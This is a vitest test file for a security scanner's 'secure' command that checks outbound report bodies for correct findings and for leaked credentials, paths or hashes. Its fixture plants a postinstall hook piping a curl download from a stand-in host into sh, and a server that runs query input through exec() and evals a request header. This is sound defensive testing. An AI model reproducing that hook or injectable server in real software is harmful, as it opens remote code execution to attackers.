/**
 * What `secure` sends is what the run found: each payload field is read from
 * the run's own result, at every send site the command has.
 *
 * Sites: `--publish` in the JSON arm and in the text arm (with its scan-token
 * request and the remediation records that follow it), `--registry-report`
 * (community report and its scan-token request), `--version-id` (version
 * report), `--ci-publish`, and the contribution event in both arms.
 *
 * Cells, on every body: no URL carries a user name, password, query string or
 * fragment; no string holds a local path of this run (target, working
 * directory, HOME, scratch); no string equals the tree hash of the working
 * directory. Per site: the scan time is the scan's own (the JSON arm prints
 * it as `timestamp`; a text arm prints the report after the scan finished and
 * before anything is sent, so the scan's time is no later than the report's
 * first findings line); findings, severities, counts, score and verdict are
 * the ones the run printed.
 *
 * Each body is also compared, byte for byte after the values that change from
 * run to run are normalized, with the body the unchanged source sent
 * (__tests__/fixtures/outbound-bodies/secure.json). Fields this change
 * corrects are named per site and set aside in that comparison only.
 *
 * Hermetic: the registry is a capture server on localhost
 * (__tests__/helpers/outbound-capture.ts), the CLI cannot reach any other
 * host, and the git remote is set on a fixture repository that is never
 * pushed or fetched.
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { assertDistFresh } from '../helpers/dist-freshness';
import { tempDir } from '../helpers/temp-dir';
import { gitFreeEnv, initThrowawayRepo } from '../helpers/throwaway-repo';
import {
  bodies,
  contributedEvent,
  differencesFromRecording,
  localPathsIn,
  ms,
  normalizeBody,
  printedAt,
  rawBodies,
  runCli,
  seedContributionQueue,
  startCaptureRegistry,
  stringsEqualTo,
  treeHashOf,
  urlsWithCredentialsOrQuery,
  type CaptureRegistry,
  type CliRun,
} from '../helpers/outbound-capture';

beforeAll(assertDistFresh);

const RECORDING = path.join(__dirname, '..', 'fixtures', 'outbound-bodies', 'secure.json');
/** A CI checkout's origin: a token in the userinfo, a ref in the query, an anchor. */
const ORIGIN = 'https://ci-user:FAKE-ci-token@github.com/example-org/outbound-fixture.git?ref=main#readme';
const TOKEN_ROUTE = 'POST /api/v1/registry/community/request-scan-token';
const PUBLISH_ROUTE = 'POST /api/v1/trust/publish';
const COMMUNITY_ROUTE = 'POST /api/v1/registry/community/scan-result';
const VERSION_ROUTE = 'POST /internal/scan-result';
const CI_ROUTE = 'POST /api/v1/registry/ci/scan-result';
const TRACK_ROUTE = 'POST /api/v1/remediation/track';
/** The categories the community report leaves off a package page (src/registry/client.ts). */
const LOCAL_ONLY = new Set(['git', 'permissions', 'environment', 'logging', 'claude-code', 'cursor', 'vscode']);

let scratch = '';
let registry: CaptureRegistry;
let target = '';
let jsonRun: CliRun;
let textRun: CliRun;
let versionRun: CliRun;
/** The document the JSON arm printed. */
let printed: Record<string, any>;

interface PrintedFinding { checkId: string; name: string; severity: string; passed: boolean; category: string; notApplicable?: boolean }

const measured = (): PrintedFinding[] => (printed.findings as PrintedFinding[]).filter((f) => !f.notApplicable);
const failed = (): PrintedFinding[] => measured().filter((f) => !f.passed);

beforeAll(async () => {
  scratch = tempDir('hma-outbound-secure-');
  registry = await startCaptureRegistry(scratch);
  target = path.join(scratch, 'target');
  fs.mkdirSync(target, { recursive: true });
  fs.writeFileSync(path.join(target, 'package.json'), JSON.stringify({
    name: 'outbound-fixture',
    version: '1.2.3',
    scripts: { postinstall: 'curl -s http://example.invalid/setup.sh | sh' },
  }, null, 2) + '\n');
  fs.writeFileSync(path.join(target, 'server.js'), [
    "const { exec } = require('child_process');",
    "require('http').createServer((req, res) => {",
    "  exec(new URL(req.url, 'http://x').searchParams.get('cmd'), (e, o) => res.end(o));",
    "  eval(req.headers['x-script']);",
    '}).listen(0);',
    '',
  ].join('\n'));
  fs.writeFileSync(path.join(target, 'SOUL.md'), '# Agent\n\nYou are a helpful assistant. You can read files and call tools.\n');
  // No commit is made, so the fixture needs no identity. The remote is added
  // with every GIT_ variable removed: under a git hook an inherited GIT_DIR
  // would write it into this repository instead of the fixture (#348).
  initThrowawayRepo(target, false);
  execFileSync('git', ['-C', target, 'remote', 'add', 'origin', ORIGIN], { env: gitFreeEnv(), stdio: 'ignore' });

  jsonRun = runCli(['secure', target, '--json', '--publish', '--contribute'], {
    runDir: path.join(scratch, 'json'), registry, before: seedContributionQueue,
  });
  textRun = runCli(['secure', target, '--publish', '--registry-report', '--ci-publish', '--contribute'], {
    runDir: path.join(scratch, 'text'), registry, before: seedContributionQueue,
    env: { CI_SCAN_HMAC_SECRET: 'FAKE-hmac-value-for-the-capture-registry' },
  });
  versionRun = runCli(['secure', target, '--version-id', 'version-from-the-test', '--registry-key', 'FAKE-registry-key'], {
    runDir: path.join(scratch, 'version'), registry,
  });
  printed = JSON.parse(jsonRun.stdout);
}, 600_000);

afterAll(() => registry?.stop());

/** The cells every body of a run is held to. */
function everyBodyProblems(run: CliRun): string[] {
  const cwdHash = treeHashOf(run.cwd);
  const roots = [scratch, target, run.cwd, run.home, os.homedir()];
  return run.requests.flatMap((q) => {
    const body = JSON.parse(q.body || 'null');
    return [
      ...urlsWithCredentialsOrQuery(body).map((p) => `${q.url} URL ${p}`),
      ...localPathsIn(body, roots).map((p) => `${q.url} local path ${p}`),
      ...stringsEqualTo(body, cwdHash).map((p) => `${q.url} working-directory tree hash at ${p}`),
    ];
  });
}

const findingCells = (fs_: Array<{ checkId: string; severity: string; passed: boolean }>) =>
  fs_.map((f) => [f.checkId, f.severity, f.passed]);

function only(run: CliRun, route: string): Record<string, any> {
  const sent = bodies(run, route);
  expect(sent.length, `${route}\n${run.stderr}`).toBe(1);
  return sent[0];
}

describe('every body secure sends', () => {
  it.each([['JSON arm', () => jsonRun], ['text arm', () => textRun], ['--version-id', () => versionRun]])(
    '%s: no URL with a user name, password, query or fragment; no local path; no tree hash of the working directory',
    (_label, run) => {
      expect(run().requests.length).toBeGreaterThan(0);
      expect(everyBodyProblems(run())).toEqual([]);
    },
  );
});

describe('secure --publish, JSON arm', () => {
  it('requests its scan token for the package the run scanned', () => {
    expect(bodies(jsonRun, TOKEN_ROUTE)).toEqual([{ packageName: 'outbound-fixture', version: '1.2.3' }]);
  });

  it('sends the findings, severities, counts, score and verdict the run printed', () => {
    const body = only(jsonRun, PUBLISH_ROUTE);
    expect(findingCells(body.findings)).toEqual(findingCells(measured()));
    expect({ score: body.score, verdict: body.verdict }).toEqual({ score: printed.score, verdict: printed.verdict });
    expect([body.criticalCount, body.highCount, body.mediumCount, body.lowCount])
      .toEqual([printed.counts.critical, printed.counts.high, printed.counts.medium, printed.counts.low]);
  });

  it('stamps the publish with the time of the scan', () => {
    expect(only(jsonRun, PUBLISH_ROUTE).scanTimestamp).toBe(printed.timestamp);
  });

  it('hashes the scanned tree, not the working directory', () => {
    expect(only(jsonRun, PUBLISH_ROUTE).treeHash).toBe(treeHashOf(target));
  });

  it('sends one remediation record per failed finding, with the severity the run printed', () => {
    const track = bodies(jsonRun, TRACK_ROUTE);
    const scanTime = only(jsonRun, PUBLISH_ROUTE).scanTimestamp;
    expect(track.map((t) => [t.findingId, t.initialSeverity])).toEqual(failed().map((f) => [f.checkId, f.severity]));
    expect(new Set(track.map((t) => `${t.agentIdentifier} ${t.sourceEventId} ${t.initialScore}`)))
      .toEqual(new Set([`outbound-fixture ${scanTime} ${printed.score}`]));
  });
});

describe('secure --publish, text arm', () => {
  it('sends the findings and verdict of the scan the run reported', () => {
    const body = only(textRun, PUBLISH_ROUTE);
    expect(findingCells(body.findings)).toEqual(findingCells(measured()));
    expect({ score: body.score, verdict: body.verdict }).toEqual({ score: printed.score, verdict: printed.verdict });
    for (const f of body.findings.filter((x: { passed: boolean }) => !x.passed)) {
      expect(textRun.stdout, `${f.checkId} is not in the report with its severity`).toContain(`${f.severity.toUpperCase()}  ${f.name}`);
    }
  });

  it('stamps the publish with the time of the scan, before the run printed its findings', () => {
    const at = ms(only(textRun, PUBLISH_ROUTE).scanTimestamp);
    expect(at).toBeGreaterThanOrEqual(textRun.startedAt);
    expect(at).toBeLessThanOrEqual(printedAt(textRun, '── Findings'));
  });

  it('hashes the scanned tree, not the working directory', () => {
    expect(only(textRun, PUBLISH_ROUTE).treeHash).toBe(treeHashOf(target));
  });
});

describe('secure --registry-report', () => {
  it('requests a scan token for the package and presents it with the report', () => {
    expect(bodies(textRun, TOKEN_ROUTE)).toEqual([
      { packageName: 'outbound-fixture', version: '1.2.3' },
      { packageName: 'outbound-fixture', version: '1.2.3' },
    ]);
    const report = textRun.requests.find((q) => `${q.method} ${q.url}` === COMMUNITY_ROUTE);
    expect(report?.scanToken).toBe('scan-token-from-capture');
  });

  it('reports the failed findings the run printed, less the local-only categories, and its counts', () => {
    const body = only(textRun, COMMUNITY_ROUTE);
    expect(body.vulnerabilities.map((v: { id: string; severity: string }) => [v.id, v.severity]))
      .toEqual(failed().filter((f) => !LOCAL_ONLY.has(f.category)).map((f) => [f.checkId, f.severity]));
    expect([body.criticalCount, body.highCount, body.mediumCount, body.lowCount])
      .toEqual([printed.counts.critical, printed.counts.high, printed.counts.medium, printed.counts.low]);
    expect(body.status).toBe(printed.verdict === 'fail' ? 'failed' : printed.verdict === 'warn' ? 'warnings' : 'passed');
  });

  it('dates the report and its id at the end of the scan, before the run printed its findings', () => {
    const body = only(textRun, COMMUNITY_ROUTE);
    expect(ms(body.completedAt)).toBeGreaterThanOrEqual(textRun.startedAt);
    expect(ms(body.completedAt)).toBeLessThanOrEqual(printedAt(textRun, '── Findings'));
    expect(ms(body.scanId)).toBe(ms(body.completedAt));
  });

  it('carries the content hash of its own canonical fields', () => {
    const b = only(textRun, COMMUNITY_ROUTE);
    const canonical = [b.scanId, b.packageName, b.packageType || '', b.version || '', b.status, b.criticalCount, b.highCount, b.mediumCount, b.lowCount].join('|');
    expect(b.contentHash).toBe(createHash('sha256').update(canonical).digest('hex'));
  });
});

describe('secure --version-id', () => {
  it('reports every failed finding the run printed, with its severity, and the counts', () => {
    const body = only(versionRun, VERSION_ROUTE);
    expect(body.versionId).toBe('version-from-the-test');
    expect(body.vulnerabilities.map((v: { id: string; severity: string }) => [v.id, v.severity]))
      .toEqual(failed().map((f) => [f.checkId, f.severity]));
    expect([body.criticalCount, body.highCount, body.mediumCount, body.lowCount])
      .toEqual([printed.counts.critical, printed.counts.high, printed.counts.medium, printed.counts.low]);
  });

  it('dates the report and its id at the end of the scan, before the run printed its findings', () => {
    const body = only(versionRun, VERSION_ROUTE);
    expect(ms(body.completedAt)).toBeGreaterThanOrEqual(versionRun.startedAt);
    expect(ms(body.completedAt)).toBeLessThanOrEqual(printedAt(versionRun, '── Findings'));
    expect(ms(body.scanId)).toBe(ms(body.completedAt));
  });
});

describe('secure --ci-publish', () => {
  it('sends the repository URL without its user name, password, query string or fragment', () => {
    expect(only(textRun, CI_ROUTE).repoUrl).toBe('https://github.com/example-org/outbound-fixture.git');
  });

  it('hashes the scanned tree, not the working directory', () => {
    expect(only(textRun, CI_ROUTE).contentHash).toBe(treeHashOf(target));
  });

  it('sends the counts, status and finding total the run reported', () => {
    const body = only(textRun, CI_ROUTE);
    expect([body.criticalCount, body.highCount, body.mediumCount, body.lowCount])
      .toEqual([printed.counts.critical, printed.counts.high, printed.counts.medium, printed.counts.low]);
    expect(body.status).toBe(printed.verdict === 'fail' ? 'failed' : printed.verdict === 'warn' ? 'warnings' : 'passed');
    expect(body.rawReport.totalFindings).toBe(printed.findings.length);
    expect(body.rawReport.settledOutcome.score).toBe(printed.score);
    expect(body.rawReport.settledOutcome.verdict).toBe(printed.verdict);
  });

  it('names the scan by the end of the scan, before the run printed its findings', () => {
    const at = ms(only(textRun, CI_ROUTE).scanId);
    expect(at).toBeGreaterThanOrEqual(textRun.startedAt);
    expect(at).toBeLessThanOrEqual(printedAt(textRun, '── Findings'));
  });
});

describe('secure --contribute', () => {
  it('JSON arm: the event carries the scan time, counts, score and verdict the run printed', () => {
    const e = contributedEvent(jsonRun);
    expect(e.package).toEqual({ name: 'outbound-fixture', version: '1.2.3', ecosystem: 'npm' });
    expect(e.timestamp).toBe(printed.timestamp);
    const s = e.scanSummary;
    expect([s.critical, s.high, s.medium, s.low]).toEqual([printed.counts.critical, printed.counts.high, printed.counts.medium, printed.counts.low]);
    expect({ score: s.score, verdict: s.verdict, exitCode: s.exitCode }).toEqual({ score: printed.score, verdict: printed.verdict, exitCode: printed.exitCode });
  });

  it('text arm: the event carries the scan time, before the run printed its findings', () => {
    const e = contributedEvent(textRun);
    expect(ms(e.timestamp)).toBeGreaterThanOrEqual(textRun.startedAt);
    expect(ms(e.timestamp)).toBeLessThanOrEqual(printedAt(textRun, '── Findings'));
    expect(e.scanSummary.verdict).toBe(printed.verdict);
  });
});

describe('what secure sends, against what the unchanged source sent', () => {
  it('every body is byte-identical once run-to-run values are normalized, apart from the fields this change corrects', () => {
    const n = (raw: string) => normalizeBody(raw, registry);
    const current: Record<string, string> = {
      'json: scan token': n(rawBodies(jsonRun, TOKEN_ROUTE)[0]),
      'json: publish': n(rawBodies(jsonRun, PUBLISH_ROUTE)[0]),
      'json: remediation records': n(JSON.stringify(bodies(jsonRun, TRACK_ROUTE))),
      'json: contribution event': n(JSON.stringify(contributedEvent(jsonRun))),
      'text: scan tokens': n(JSON.stringify(bodies(textRun, TOKEN_ROUTE))),
      'text: community report': n(rawBodies(textRun, COMMUNITY_ROUTE)[0]),
      'text: publish': n(rawBodies(textRun, PUBLISH_ROUTE)[0]),
      'text: ci submission': n(rawBodies(textRun, CI_ROUTE)[0]),
      'text: contribution event': n(JSON.stringify(contributedEvent(textRun))),
      'version report': n(rawBodies(versionRun, VERSION_ROUTE)[0]),
    };
    expect(differencesFromRecording(RECORDING, current, CHANGED)).toEqual([]);
  });
});

/**
 * The fields this change corrects, per site (see the commit that added this
 * test). The CI submission's repoUrl kept the remote's query string and
 * fragment (`.git?ref=main#readme`).
 */
const CHANGED: Record<string, readonly string[]> = {
  'text: ci submission': ['repoUrl'],
};
